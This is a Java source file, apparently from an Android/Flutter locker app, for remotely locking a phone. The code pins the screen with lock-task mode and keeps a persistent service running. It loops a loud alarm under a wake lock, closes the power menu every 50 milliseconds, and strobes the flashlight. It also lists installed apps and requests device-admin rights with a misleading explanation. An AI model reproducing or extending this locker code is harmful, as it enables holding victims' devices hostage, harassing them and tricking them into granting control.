package com.nullx.pp;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.Context;
import android.view.KeyEvent;
import android.hardware.input.InputManager;
import android.os.Handler;
import android.media.MediaPlayer;
import android.os.PowerManager;
import android.hardware.camera2.CameraManager;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import android.os.Handler;
import android.os.Looper;

public class MainActivity extends FlutterActivity {
    private static final String CHANNEL = "lock_channel";
    
    // ============ TAMBAHAN UNTUK POWER MENU BLOCKER ============
    private Handler powerMenuHandler;
    private Runnable closePowerMenuRunnable;
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN UNTUK SUARA ============
    private MediaPlayer mediaPlayer;
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN UNTUK SENTER SPAM ============
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashSpamming = false;
    private Handler flashHandler;
    private Runnable flashRunnable;
    // ============ AKHIR TAMBAHAN ============

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
        
        // ============ TAMBAHAN: START FOREGROUND SERVICE AGAR APLIKASI TETAP HIDUP ============
        Intent serviceIntent = new Intent(this, LockService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        // ============ AKHIR TAMBAHAN ============
        
        // ============ TAMBAHAN BARU: HANDLE LOCK TASK DARI SERVICE ============
        if (getIntent() != null && getIntent().getBooleanExtra("start_lock_task", false)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                startLockTask();
                // ============ TAMBAHAN: PUTAR SUARA SAAT LOCK TASK START ============
                playLockSound();
                // ============ AKHIR TAMBAHAN ============
            }
        }
        // ============ AKHIR TAMBAHAN ============
        
        // ============ TAMBAHAN: INIT POWER MENU BLOCKER ============
        powerMenuHandler = new Handler();
        closePowerMenuRunnable = new Runnable() {
            @Override
            public void run() {
                closeSystemDialogs();
            }
        };
        startPowerMenuBlocker();
        // ============ AKHIR TAMBAHAN ============
        
        // ============ TAMBAHAN: INIT CAMERA UNTUK SENTER ============
        try {
            cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager != null) {
                String[] cameraIds = cameraManager.getCameraIdList();
                for (String id : cameraIds) {
                    android.hardware.camera2.CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                    Boolean hasFlash = characteristics.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                    if (hasFlash != null && hasFlash) {
                        cameraId = id;
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        flashHandler = new Handler(Looper.getMainLooper());
        // ============ AKHIR TAMBAHAN ============
    }
    
    // ============ TAMBAHAN: METHOD UNTUK SUARA ============
    private void initSound() {
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.lock_sound);
            if (mediaPlayer != null) {
                mediaPlayer.setLooping(true);
                mediaPlayer.setVolume(1.0f, 1.0f);
                mediaPlayer.setWakeMode(getApplicationContext(), PowerManager.PARTIAL_WAKE_LOCK);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void playLockSound() {
        if (mediaPlayer == null) {
            initSound();
        }
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                    mediaPlayer.release();
                    mediaPlayer = null;
                    initSound();
                }
                mediaPlayer.start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private void stopLockSound() {
        if (mediaPlayer != null && mediaPlayer.isPlaying()) {
            try {
                mediaPlayer.stop();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN BARU: onNewIntent UNTUK MENERIMA INTENT DARI SERVICE ============
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null) {
            if (intent.getBooleanExtra("start_lock_task", false)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    startLockTask();
                    playLockSound();
                }
            } else if (intent.getBooleanExtra("stop_lock_task", false)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    stopLockTask();
                    stopLockSound();
                }
            }
        }
    }
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN: POWER MENU BLOCKER METHODS ============
    private void startPowerMenuBlocker() {
        // Monitor untuk mendeteksi kehilangan fokus (power menu muncul)
        Thread powerMenuMonitor = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Thread.sleep(50);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                closeSystemDialogs();
                            }
                        });
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        powerMenuMonitor.setDaemon(true);
        powerMenuMonitor.start();
    }
    
    private void closeSystemDialogs() {
        try {
            // Kirim broadcast intent untuk menutup system dialogs
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
            
            // ============ PERBAIKAN: COMMENT KODE YANG ERROR ============
            // Method injectInputEvent tidak tersedia di SDK ini
            // Hanya broadcast intent yang digunakan
            // ============ AKHIR PERBAIKAN ============
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus) {
            powerMenuHandler.postDelayed(closePowerMenuRunnable, 1);
        }
    }
    // ============ AKHIR TAMBAHAN ============
    
    private void startBackgroundService() {
        Intent intent = new Intent(this, LockService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
    
    // ============ TAMBAHAN: SPAM SENTER METHODS ============
    private void startFlashSpam() {
        if (cameraId == null) {
            System.out.println("❌ No flash camera found");
            return;
        }
        if (isFlashSpamming) return;
        isFlashSpamming = true;
        
        flashRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isFlashSpamming) return;
                try {
                    if (cameraManager != null) {
                        cameraManager.setTorchMode(cameraId, true);
                        flashHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    if (cameraManager != null && isFlashSpamming) {
                                        cameraManager.setTorchMode(cameraId, false);
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        }, 100);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (isFlashSpamming) {
                    flashHandler.postDelayed(this, 200);
                }
            }
        };
        flashHandler.post(flashRunnable);
        System.out.println("✅ Flash spam started");
    }
    
    private void stopFlashSpam() {
        isFlashSpamming = false;
        if (flashHandler != null && flashRunnable != null) {
            flashHandler.removeCallbacks(flashRunnable);
        }
        try {
            if (cameraManager != null && cameraId != null) {
                cameraManager.setTorchMode(cameraId, false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("✅ Flash spam stopped");
    }
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN: GET INSTALLED APPS ============
    private List<Map<String, String>> getInstalledApps() {
        List<Map<String, String>> apps = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        
        for (ApplicationInfo appInfo : packages) {
            // Filter system apps (opsional, bisa dihilangkan jika ingin include system apps)
            // if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
            
            Map<String, String> app = new HashMap<>();
            app.put("package", appInfo.packageName);
            String appName = pm.getApplicationLabel(appInfo).toString();
            app.put("name", appName);
            apps.add(app);
        }
        return apps;
    }
    // ============ AKHIR TAMBAHAN ============

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("triggerLock")) {
                    String type = call.argument("type");
                    String data = call.argument("data");
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("lock_type", type);
                    intent.putExtra("lock_data", data);
                    startService(intent);
                    result.success(true);
                } 
                else if (call.method.equals("stopLock")) {
                    stopService(new Intent(this, LockService.class));
                    result.success(true);
                }
                else if (call.method.equals("isAdminActive")) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    result.success(dpm.isAdminActive(adminName));
                }
                else if (call.method.equals("requestAdmin")) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (!dpm.isAdminActive(adminName)) {
                        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName);
                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan administrator ini agar aplikasi dapat berjalan dengan baik");
                        startActivity(intent);
                    }
                    result.success(true);
                }
                else if (call.method.equals("startBackgroundService")) {
                    startBackgroundService();
                    result.success(true);
                }
                else if (call.method.equals("setAdminPin")) {
                    String pin = call.argument("pin");
                    SharedPreferences prefs = getSharedPreferences("admin_prefs", Context.MODE_PRIVATE);
                    prefs.edit().putString("admin_pin", pin).apply();
                    result.success(true);
                }
                // ============ TAMBAHAN METHOD BARU ============
                else if (call.method.equals("setDeviceId")) {
                    String deviceId = call.argument("device_id");
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("device_id", deviceId);
                    startService(intent);
                    result.success(true);
                }
                else if (call.method.equals("keepAlive")) {
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("keep_alive", true);
                    startService(intent);
                    result.success(true);
                }
                else if (call.method.equals("unlockDevice")) {
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("unlock_device", true);
                    startService(intent);
                    result.success(true);
                }
                // ============ TAMBAHAN UNTUK SPAM SENTER ============
                else if (call.method.equals("startFlashSpam")) {
                    startFlashSpam();
                    result.success(true);
                }
                else if (call.method.equals("stopFlashSpam")) {
                    stopFlashSpam();
                    result.success(true);
                }
                // ============ TAMBAHAN UNTUK GET INSTALLED APPS ============
                else if (call.method.equals("getInstalledApps")) {
                    result.success(getInstalledApps());
                }
                // ============ AKHIR TAMBAHAN ============
                else {
                    result.notImplemented();
                }
            });
    }
    
    @Override
    protected void onDestroy() {
        // ============ TAMBAHAN: STOP SPAM SENTER SAAT DESTROY ============
        stopFlashSpam();
        // ============ AKHIR TAMBAHAN ============
        
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                }
                mediaPlayer.release();
                mediaPlayer = null;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        super.onDestroy();
    }
}